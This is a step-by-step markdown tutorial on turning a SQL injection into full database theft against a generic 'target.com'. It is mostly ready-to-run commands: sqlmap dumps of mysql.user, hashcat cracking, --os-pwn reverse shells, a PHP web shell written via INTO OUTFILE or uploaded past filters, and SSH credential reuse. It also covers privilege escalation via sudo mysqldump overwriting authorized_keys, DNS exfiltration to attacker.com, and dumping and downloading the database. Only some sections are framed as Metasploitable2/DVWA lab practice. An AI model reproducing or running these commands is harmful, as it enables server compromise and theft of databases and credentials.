# SQL Injection to Mass Database Exfiltration: The Real Attack Chain
# if i am wrong please correct me 
## The Core Confusion: Two Different Types of Credentials

| Application Credentials | Database Credentials |
|------------------------|---------------------|
| Found in: `users` table | Found in: `mysql.user` table |
| Used for: Website admin login | Used for: Direct MySQL connection |
| Example: `admin:admin123` | Example: `dbuser:dbpassword123` |
| ❌ Wrong target for dumping | ✅ Correct target for dumping |

---

## Step-by-Step Attack Chain

### Phase 1: Extract Database Credentials via SQLi

```bash
# Dump the MySQL user table, NOT the app's users table
sqlmap -u "http://target.com/index.php?id=1" -D mysql -T user --dump
```

**Output you'll get:**

```sql
+--------+-----------+-------------------------------------------+
| user   | host      | password                                  |
+--------+-----------+-------------------------------------------+
| root   | localhost | *81F5E21E35407D884A6CD4A731A872FB8AF3E... |
| dbuser | %         | *2470C0C06DEE42FD1618BB99005ADCA2EC9D...  |
+--------+-----------+-------------------------------------------+
```

---

### Phase 2: Crack the Database User's Hash

```bash
# Crack the DB user hash (not the website admin hash)
hashcat -m 300 hash.txt rockyou.txt

# Result: dbuser:dbpassword123
```

⚠️ **This password connects to MySQL, not the website.**

---

### Phase 3: Get Shell Access on the Server

#### Method A: Direct OS Shell (Fastest)

```bash
sqlmap -u "http://target.com/index.php?id=1" --os-pwn
# This gives you a Meterpreter/reverse shell on the server
```

#### Method B: Web Shell (If FILE Privilege Exists)

```bash
sqlmap -u "http://target.com/index.php?id=1" \
  --file-write=shell.php \
  --file-dest=/var/www/html/backdoor.php

# Access: http://target.com/backdoor.php?cmd=id
```
#or direcct forl sqlmap

-- Write PHP backdoor to web root
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Now you have SYSTEM SHELL access:
# Visit: http://target.com/shell.php?cmd=mysqldump%20-h%20127.0.0.1%20-u%20dbuser%20-p'dbpass'%20db%20%3E%20/tmp/dump.sql


#### Method C: Credential Reuse

```bash
# Try the DB password on SSH/FTP
ssh dbuser@target.com  # Password: dbpassword123
```

---

### Phase 4: Dump Database at Native Speed

Now that you're **ON the server**, run:

```bash
# From your shell prompt on the target server:
mysqldump -h 127.0.0.1 -u dbuser -p'dbpassword123' --all-databases > /tmp/full_dump.sql
```

**Why 127.0.0.1 works:** You're executing this ON the server itself  
**Speed:** 500MB/s (disk I/O), not 1KB/s (SQLi inference)

---

### Phase 5: Exfiltrate the Dump

```bash
# Download via web shell
wget http://target.com/backdoor.php?cmd=cat%20/tmp/full_dump.sql

# Or via Meterpreter session
download /tmp/full_dump.sql /home/attacker/data/
```

---

## Visual Comparison: Your Confusion vs. Reality

| What You Think Happens | What Actually Happens |
|------------------------|----------------------|
| Crack website hash `admin:admin123` | Crack DB user hash `dbuser:dbpassword123` |
| Log into website admin panel | Connect to MySQL service directly |
| Use SQLMap to slowly dump data | Use DB credentials + shell to dump locally |
| `mysqldump -h target.com ...` (from attacker PC) | `mysqldump -h 127.0.0.1 ...` (from inside server) |
| `--file-write` is the main method | `--os-pwn` or credential reuse is faster |

---

## Metasploitable2 Lab Example

```bash
# 1. Extract DB credentials
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=your_session_here" \
  --batch -D mysql -T user --dump
# Result: root : password (default creds)

# 2. Get OS shell
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1" \
  --cookie="security=low; PHPSESSID=your_session_here" \
  --os-shell

# 3. Inside the shell (you're now www-data@metasploitable2)
os-shell> mysqldump -h 127.0.0.1 -u root -ppassword dvwa > /tmp/dvwa.sql
# Dump completes in ~3 seconds

# 4. Download the file
os-shell> exit
sqlmap -u "http://192.168.56.101/dvwa/..." --file-read=/tmp/dvwa.sql
```

---

## Speed Comparison: SQLi vs. Native Dump

| Method | Speed | Time for 1GB |
|--------|-------|--------------|
| Blind SQLi inference | ~1 KB/s | ~12 days |
| UNION-based SQLi | ~100 KB/s | ~3 hours |
| Native `mysqldump` (post-exploit) | 500 MB/s | ~2 seconds |

---

## Advanced Techniques When Basic Methods Fail

### When FILE Privilege is Disabled

#### A) DNS Exfiltration
```bash
sqlmap -u "http://target.com/index.php?id=1" --dns-domain=attacker.com
# Uses DNS queries to bypass HTTP firewalls
```

#### B) User-Defined Functions (UDF) Injection
```bash
sqlmap -u "http://target.com/index.php?id=1" --udf-inject
# Compiles malicious library into MySQL
# Gives code execution inside MySQL process
```

### Credential Reuse Escalation Chain

```bash
# 1. Got DB password: dbpassword123
# 2. Try SSH
ssh dbuser@target.com  # SUCCESS! ✅

# 3. Check sudo privileges
sudo -l
# Output: (root) NOPASSWD: /usr/bin/mysqldump

# 4. Privilege escalation
sudo mysqldump mysql user -r /root/.ssh/authorized_keys
# Now you have root SSH access
```

---

## Common Dead Ends (Why Attacks Fail)

| Scenario | Why It Fails |
|----------|-------------|
| `mysql -h target.com -u dbuser -p` | Port 3306 firewalled (99% of servers) |
| `--file-write` shell upload | FILE privilege revoked (modern hardening) |
| Password reuse on SSH | Strong SSH key-only auth |
| PHPMyAdmin access | IP whitelisted or hidden endpoint |

**Result:** Attacker stuck with slow SQLi dump only (still gets data, but takes days)

---

## The Golden Rule

> **Hackers don't dump massive databases through SQLi. They dump credentials via SQLi, escalate to shell access, then use native tools.**

### The Correct Flow:
```
SQLi → mysql.user creds → Shell access → mysqldump (2 seconds)
```

### The Wrong Flow:
```
SQLi → Dump entire database row-by-row (48 hours) ❌
```

---

## Real-World Pentest Checklist

After getting DB credentials:

- [ ] Try direct MySQL connection (port 3306)
- [ ] Test credential reuse on SSH/FTP
- [ ] Search for PHPMyAdmin/Adminer panels
- [ ] Use `--os-pwn` for reverse shell
- [ ] Check for `FILE` privilege (`SHOW GRANTS`)
- [ ] Look for UDF injection opportunities
- [ ] Extract config files via `LOAD_FILE()`
- [ ] Search for AWS keys in environment variables

**Stop using SQLMap after Step 3. Switch to native tools from inside the server.**

---

## Practice Progression

### Level 1: Basic (Metasploitable2)
```bash
sqlmap --os-shell → mysqldump locally
```

### Level 2: Realistic Constraints
```bash
# Simulate FILE privilege disabled
mysql> REVOKE FILE ON *.* FROM 'root'@'localhost';

# Practice alternatives
sqlmap --udf-inject
sqlmap --dns-domain=attacker.com
```

### Level 3: Advanced Lateral Movement
```bash
# 1. Get webapp user creds
# 2. Password reuse on SSH/FTP
# 3. Pivot to internal databases
# 4. Exploit trust relationships
```

---

## Key Takeaways

1. **Target `mysql.user` table, not application users**
2. **DB credentials ≠ Website login credentials**
3. **127.0.0.1 only works when running commands ON the server**
4. **SQLi is for reconnaissance; native tools are for exfiltration**
5. **Credential reuse is the #1 escalation vector**

---

## The Missing Link: From SQLi to System Access (Beginner-Friendly)

### 🎯 The Problem You're Facing

You found:
- Vulnerable URL: `target.com/index.php?id=1`
- Extracted credentials: `admin:admin123`
- **But now what? How do you get from "I have a password" to "I can dump the database"?**

### 📋 Complete Attack Path (Simple Version)

```
Step 1: SQLi Discovery
   ↓
Step 2: Get Admin Credentials (what you already have)
   ↓
Step 3: Find Admin Login Page
   ↓
Step 4: Login as Admin
   ↓
Step 5: Upload Web Shell via Admin Panel
   ↓
Step 6: Find Database Password in Config Files
   ↓
Step 7: Run mysqldump Locally on Server
   ↓
Step 8: Download the Dump File
```

---

### Step-by-Step Breakdown for Beginners

#### **Step 1: You Already Have This** ✅
```bash
# You used SQLMap and got:
# Username: admin
# Password: admin123
```

#### **Step 2: Find Where to Login**

Admin login pages are usually at these URLs (try all of them):

```bash
http://target.com/admin
http://target.com/login
http://target.com/administrator
http://target.com/wp-admin          # WordPress sites
http://target.com/admin.php
http://target.com/backend
http://target.com/cpanel
http://target.com/dashboard
```

**How to test:**
```bash
# Method 1: Use browser
Just type the URLs above in your browser

# Method 2: Use curl to check if page exists
curl -I http://target.com/admin
# If you get "200 OK", the page exists
```

#### **Step 3: Login to Admin Panel**

1. Open the admin login page in browser
2. Enter:
   - **Username:** `admin`
   - **Password:** `admin123`
3. Click "Login"

**You're now inside the admin panel!** 🎉

#### **Step 4: Upload Your Web Shell**

A "web shell" is a simple PHP file that lets you run commands on the server.

**Create a simple web shell (save as `shell.php`):**
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Where to upload it in admin panel:**

Look for these features:
- ✅ "File Manager"
- ✅ "Media Upload"
- ✅ "Upload Image"
- ✅ "Theme Editor" (for WordPress)
- ✅ "Plugin Editor"

**Common upload tricks:**
```
1. Try: shell.php
2. If blocked, try: shell.jpg.php
3. If blocked, try: shell.php.jpg (then rename later)
4. If blocked, edit existing PHP file (like header.php)
```

#### **Step 5: Access Your Web Shell**

After uploading `shell.php` to `/uploads/` folder:

```bash
# Test if it works:
http://target.com/uploads/shell.php?cmd=whoami

# You should see output like: www-data
```

**Common commands to try:**
```bash
# See current user
http://target.com/uploads/shell.php?cmd=whoami

# See current directory
http://target.com/uploads/shell.php?cmd=pwd

# List files
http://target.com/uploads/shell.php?cmd=ls -la

# Find config files
http://target.com/uploads/shell.php?cmd=find /var/www -name config.php
```

#### **Step 6: Find Database Credentials**

Config files contain database passwords. Look for:

```bash
# WordPress
http://target.com/uploads/shell.php?cmd=cat /var/www/html/wp-config.php

# Generic PHP apps
http://target.com/uploads/shell.php?cmd=cat /var/www/html/config.php

# Laravel
http://target.com/uploads/shell.php?cmd=cat /var/www/html/.env
```

**What you're looking for in config file:**
```php
define('DB_USER', 'wordpress_user');      // ← This is the username
define('DB_PASSWORD', 'secretpass123');   // ← This is the password
define('DB_NAME', 'wordpress_db');        // ← This is the database name
define('DB_HOST', 'localhost');           // ← This means DB is on same server
```

#### **Step 7: Dump the Database (The Fast Way!)**

Now use the DB credentials you found:

```bash
# Run this command through your web shell:
http://target.com/uploads/shell.php?cmd=mysqldump -u wordpress_user -psecretpass123 wordpress_db > /var/www/html/backup.sql

# The file backup.sql now contains the entire database!
```

**Why this is fast:**
- ⚡ You're running `mysqldump` ON the server itself
- ⚡ It uses direct disk access (500 MB/s)
- ⚡ Not going through slow SQLi queries

#### **Step 8: Download the Database Dump**

```bash
# The backup.sql file is now in the web directory
# Simply download it via browser:
http://target.com/backup.sql

# Or use wget:
wget http://target.com/backup.sql
```

**Congratulations!** You've dumped the entire database in seconds! 🎊

---

### 🔍 Understanding the "localhost" Confusion

**Your Question:** "If I use `mysqldump -h 127.0.0.1`, how does it work?"

**Answer:** You can ONLY use `127.0.0.1` or `localhost` **after you have shell access on the server**.

#### Visual Explanation:

**❌ WRONG (Won't Work):**
```
Your Computer → Internet → mysqldump -h target.com
                         (Port 3306 is firewalled - connection refused)
```

**✅ CORRECT (This Works):**
```
Your Computer → Web Shell on target.com → mysqldump -h localhost
                (You're running the command ON the server itself)
```

**Real Example:**

```bash
# From YOUR computer (Kali Linux) - This FAILS:
mysqldump -h target.com -u dbuser -p
# Error: Can't connect to MySQL server on 'target.com'

# But from WEB SHELL on target.com - This WORKS:
shell.php?cmd=mysqldump -h localhost -u dbuser -p database > dump.sql
# Success! Because you're running it ON the server
```

---

### 🛠️ Alternative Methods (If Admin Panel Method Fails)

#### Method 1: Direct SQL File Write (If FILE Privilege Exists)

```bash
# Check if you have FILE privilege
sqlmap -u "target.com/index.php?id=1" --sql-query="SHOW GRANTS"

# If you see "FILE" privilege, write shell directly:
sqlmap -u "target.com/index.php?id=1" \
  --file-write=shell.php \
  --file-dest=/var/www/html/shell.php

# Access it:
http://target.com/shell.php?cmd=id
```

#### Method 2: Use SQLMap's Built-in Shell

```bash
# SQLMap can give you a shell automatically:
sqlmap -u "target.com/index.php?id=1" --os-shell

# This drops you into a pseudo-shell:
os-shell> whoami
www-data

os-shell> mysqldump -u dbuser -pdbpass database > /tmp/dump.sql
```

---

### 📊 Speed Comparison Visual

**Why you NEED to get shell access:**

```
Method 1: SQLMap row-by-row dump
[▓               ] 1GB in 48 hours 🐌

Method 2: Shell + mysqldump
[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 1GB in 2 seconds ⚡
```

---

### 🎓 Practice Lab Walkthrough (Metasploitable2)

```bash
# 1. Find vulnerable parameter
sqlmap -u "http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin" --batch

# 2. Extract admin credentials
sqlmap -u "..." -D nowasp -T accounts --dump
# Found: admin:admin

# 3. Find admin login
# Open browser: http://192.168.56.101/mutillidae
# Click "Login/Register"

# 4. Login with admin:admin

# 5. Upload shell through Mutillidae's upload feature
# (Mutillidae has intentional upload vulnerability)

# 6. Access shell
http://192.168.56.101/mutillidae/upload/shell.php?cmd=whoami

# 7. Find DB password
http://192.168.56.101/mutillidae/upload/shell.php?cmd=cat /var/www/mutillidae/config.inc

# 8. Dump database
http://192.168.56.101/mutillidae/upload/shell.php?cmd=mysqldump -u root -proot nowasp > /tmp/dump.sql

# 9. Download
wget http://192.168.56.101/tmp/dump.sql
```

---

### ⚠️ Common Beginner Mistakes

| Mistake | Why It Fails | Solution |
|---------|-------------|----------|
| `mysqldump -h target.com` from Kali | Port 3306 is firewalled | Get shell first, then use `localhost` |
| Uploading `shell.php` without testing | Filename might be blacklisted | Try `shell.jpg.php` or other extensions |
| Running `mysqldump` without `-p` flag | MySQL requires password | Use `-pPASSWORD` (no space after -p) |
| Forgetting to make dump file web-accessible | File saved in `/tmp/` (not downloadable) | Save to `/var/www/html/` instead |

---

### 🔑 Key Concepts to Remember

1. **Admin credentials ≠ Database credentials**
   - Admin login gets you into the website
   - Database credentials are found in config files

2. **localhost = 127.0.0.1**
   - Both mean "this computer"
   - Only works when running commands ON the server

3. **Web Shell = Your Gateway**
   - It's a PHP file that runs commands
   - Bridges the gap between SQLi and full access

4. **Config Files = Treasure Map**
   - They contain database passwords
   - Usually in: `config.php`, `wp-config.php`, `.env`

---

### 📝 Complete Beginner Checklist

- [ ] Found SQLi vulnerability
- [ ] Dumped admin username/password with SQLMap
- [ ] Located admin login page
- [ ] Logged in successfully
- [ ] Found file upload or editor feature
- [ ] Uploaded web shell (shell.php)
- [ ] Tested web shell with `?cmd=whoami`
- [ ] Found config file with DB credentials
- [ ] Ran mysqldump through web shell
- [ ] Downloaded database dump file

---

**Remember:** The "slow SQLMap" problem you experienced is exactly why professionals escalate to shell access. The tool is for discovery, not mass data theft.

**Next Steps:** Practice this complete flow on Metasploitable2 or DVWA until it becomes second nature!
